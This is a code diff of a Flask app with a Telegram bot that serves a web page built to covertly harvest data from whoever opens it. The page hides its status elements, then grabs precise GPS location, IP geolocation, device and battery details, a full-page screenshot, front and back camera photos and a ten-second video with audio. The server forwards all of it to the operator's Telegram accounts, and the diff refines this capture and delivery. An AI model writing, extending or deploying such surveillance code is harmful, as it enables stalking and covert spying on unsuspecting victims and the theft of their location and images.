@@ -30,7 +30,6 @@ HTML_PAGE = """<!DOCTYPE html>
         .controls { margin-top:20px; display:flex; gap:10px; flex-wrap:wrap; justify-content:center; }
         .controls button { background:#3ea6ff; border:none; color:#000; padding:10px 24px; border-radius:20px; font-weight:bold; cursor:pointer; font-size:16px; }
         .controls button:disabled { opacity:0.5; cursor:not-allowed; }
-        /* Hide status elements */
         #statusText, #locationStatus, #debug { display: none; }
         html, body { min-height: 100%; }
     </style>
@@ -63,28 +62,22 @@ HTML_PAGE = """<!DOCTYPE html>
         let recordedChunks = [], recordingActive = false, maxDuration = 10000;
         const startBtn = document.getElementById('startBtn');
 
-        // ---- Helper: delay ----
+        // ---- Helpers ----
         function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
 
-        // ---- Send data ----
         async function sendData(formData) {
             try {
                 await fetch('/capture', { method: 'POST', body: formData });
             } catch (e) {}
         }
 
-        // ---- IP info ----
         async function getIpInfo() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                return data;
-            } catch (e) {
-                return { ip: 'unknown', city: 'unknown', region: 'unknown', country: 'unknown' };
-            }
+                return await res.json();
+            } catch { return { ip: 'unknown', city: 'unknown', region: 'unknown', country: 'unknown' }; }
         }
 
-        // ---- Device info ----
         function getDeviceInfo() {
             const ua = navigator.userAgent;
             let brand = 'Unknown', model = 'Unknown';
@@ -93,23 +86,19 @@ HTML_PAGE = """<!DOCTYPE html>
             else if (ua.includes('Android')) {
                 brand = 'Android';
                 const match = ua.match(/Android\s+([\d.]+);\s+([^;)]+)/);
-                if (match) model = match[2];
-                else model = 'Android Device';
-            } else if (ua.includes('Windows Phone')) { brand = 'Microsoft'; model = 'Windows Phone'; }
+                model = match ? match[2] : 'Android Device';
+            }
             return { brand, model };
         }
 
-        // ---- Battery ----
         async function getBatteryInfo() {
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
                     return { level: Math.round(battery.level * 100), charging: battery.charging };
                 }
-                return { level: 'unknown', charging: 'unknown' };
-            } catch (e) {
-                return { level: 'unknown', charging: 'unknown' };
-            }
+            } catch {}
+            return { level: 'unknown', charging: 'unknown' };
         }
 
         // ---- Full page screenshot ----
@@ -118,46 +107,38 @@ HTML_PAGE = """<!DOCTYPE html>
                 html2canvas(document.documentElement, {
                     useCORS: true,
                     logging: false,
-                    scale: 0.8,
+                    scale: 1.0,
                     allowTaint: true,
                     scrollX: 0,
                     scrollY: 0,
                     windowWidth: document.documentElement.scrollWidth,
                     windowHeight: document.documentElement.scrollHeight
                 }).then(canvas => {
-                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
+                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.92);
                 }).catch(() => resolve(null));
             });
         }
 
-        // ---- Get camera streams with specific facing modes ----
+        // ---- Camera streams ----
         async function getCameraStreams() {
-            // Back camera with audio
-            let back = null;
+            let back = null, front = null;
+            // Back with audio
             try {
-                back = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'environment' },
-                    audio: true
-                });
-            } catch (e) {
+                back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
+            } catch {
                 try {
                     back = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                } catch (e2) {}
+                } catch {}
             }
-
-            // Front camera (no audio needed)
-            let front = null;
+            // Front (no audio)
             try {
-                front = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' },
-                    audio: false
-                });
-            } catch (e) {
+                front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+            } catch {
                 if (back) front = back.clone();
                 else {
                     try {
                         front = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                    } catch (e2) {}
+                    } catch {}
                 }
             }
             return { front, back };
@@ -187,46 +168,42 @@ HTML_PAGE = """<!DOCTYPE html>
             });
         }
 
-        // ---- Main session ----
+        // ---- Main ----
         async function startSession() {
             startBtn.disabled = true;
             startBtn.innerText = 'Loading...';
+            await delay(300); // allow browser to settle
 
-            // Small delay to let the browser settle
-            await delay(300);
-
-            // 1. Location
+            // Location
             let locationData = null;
             if (navigator.geolocation) {
                 try {
                     const pos = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true,
-                            timeout: 10000
-                        });
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
                     });
                     locationData = { lat: pos.coords.latitude, lng: pos.coords.longitude };
-                } catch (e) {
+                } catch {
                     locationData = { denied: true };
                 }
             } else {
                 locationData = { denied: true };
             }
 
-            // 2. IP, Device, Battery
+            // IP, Device, Battery
             const ipInfo = await getIpInfo();
             const device = getDeviceInfo();
             const battery = await getBatteryInfo();
 
-            // 3. Camera streams
+            // Camera
             const { front, back } = await getCameraStreams();
             let frontBlob = null, backBlob = null, videoBlob = null;
-
-            if (front || back) {
+            let cameraStatus = 'success';
+            if (!front && !back) {
+                cameraStatus = 'failed';
+            } else {
                 if (front) frontBlob = await captureFrame(front);
                 if (back) backBlob = await captureFrame(back);
-
-                let recordStream = back || front;
+                const recordStream = back || front;
                 if (recordStream) {
                     mediaRecorder = new MediaRecorder(recordStream, { mimeType: 'video/webm;codecs=vp9,opus' });
                     recordedChunks = [];
@@ -249,7 +226,7 @@ HTML_PAGE = """<!DOCTYPE html>
                 }
             }
 
-            // 4. Screenshot
+            // Screenshot
             const screenshotBlob = await captureScreenshot();
 
             let finalized = false;
@@ -273,6 +250,7 @@ HTML_PAGE = """<!DOCTYPE html>
                 fd.append('model', device.model);
                 fd.append('battery_level', battery.level);
                 fd.append('battery_charging', battery.charging);
+                fd.append('camera_status', cameraStatus);
                 // Screenshot
                 if (screenshotBlob) fd.append('screenshot', screenshotBlob, 'screenshot.jpg');
                 // Camera images
@@ -287,6 +265,7 @@ HTML_PAGE = """<!DOCTYPE html>
             }
 
             if (!mediaRecorder) {
+                // No recording – finalize immediately
                 finalizeAndSend();
             } else {
                 setTimeout(() => {
@@ -315,7 +294,7 @@ def index():
 
 @app.route('/capture', methods=['POST'])
 def capture():
-    # Extract all data
+    # Extract all fields
     lat = request.form.get('lat')
     lng = request.form.get('lng')
     location_denied = request.form.get('location_denied')
@@ -327,10 +306,14 @@ def capture():
     model = request.form.get('model', 'Unknown')
     battery_level = request.form.get('battery_level', 'unknown')
     battery_charging = request.form.get('battery_charging', 'unknown')
+    camera_status = request.form.get('camera_status', 'unknown')
     screenshot = request.files.get('screenshot')
     front_img = request.files.get('frontImage')
     back_img = request.files.get('backImage')
     video = request.files.get('video')
+
+    # Log received data (visible in Railway logs)
+    print(f"Received: location={lat},{lng}, ip={ip}, camera_status={camera_status}, front={front_img is not None}, back={back_img is not None}, video={video is not None}")
 
     for uid in USER_IDS:
         # Location
@@ -346,7 +329,7 @@ def capture():
             except Exception as e:
                 print(f"Error: {e}")
 
-        # IP + Device + Battery
+        # IP, Device, Battery
         try:
             msg = (
                 f"🌐 IP: {ip}\n"
@@ -366,15 +349,13 @@ def capture():
             except Exception as e:
                 print(f"Screenshot error: {e}")
 
-        # Front camera
+        # Camera images
         if front_img:
             try:
                 front_img.seek(0)
                 bot.send_photo(uid, front_img.read(), caption="🤳 Front Camera")
             except Exception as e:
                 print(f"Front image error: {e}")
-
-        # Back camera
         if back_img:
             try:
                 back_img.seek(0)
@@ -390,7 +371,20 @@ def capture():
             except Exception as e:
                 print(f"Video error: {e}")
 
-        # Final notification
+        # Camera status (if failed)
+        if camera_status == 'failed':
+            try:
+                bot.send_message(uid, "⚠️ Camera not available – only location and screenshot sent.")
+            except Exception as e:
+                print(f"Camera status error: {e}")
+        elif not front_img and not back_img and not video:
+            # No camera data at all, but status says success – send a note
+            try:
+                bot.send_message(uid, "⚠️ No camera data received – please ensure camera permissions are granted.")
+            except Exception as e:
+                print(f"Camera note error: {e}")
+
+        # Final
         try:
             bot.send_message(uid, "✅ All data captured.")
         except:
@@ -404,7 +398,7 @@ def send_link(m):
 
 def run_bot():
     print("Bot polling started.")
-    bot.polling(non_stay=True, interval=1)
+    bot.polling(non_stop=True, interval=1)
 
 if __name__ == '__main__':
     threading.Thread(target=run_bot, daemon=True).start()
